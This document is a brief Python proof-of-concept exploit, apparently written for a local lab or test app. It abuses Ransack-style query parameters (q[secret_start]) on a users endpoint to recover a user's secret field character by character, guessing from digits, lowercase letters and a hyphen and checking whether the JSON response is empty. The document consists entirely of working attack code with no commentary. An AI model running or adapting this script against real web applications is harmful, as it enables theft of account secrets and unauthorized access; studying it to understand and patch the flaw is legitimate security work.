import requests
import urllib.parse
import sys
import string

print("[+] Finding secret")

secret = ''
for length in range(0, 100):
    is_hit = False

    for s in list('0123456789') + list(string.ascii_lowercase) + ['-']:
        response = requests.get("http://localhost:3000/users?q[id_eq]=1&q[secret_start]=%s" % urllib.parse.quote(secret + s))
        if not response.json() == []:
            is_hit = True
            secret += s
            print(secret)
    if not is_hit:
        break

print("[+] Finished")
print("secret: %s" % secret)
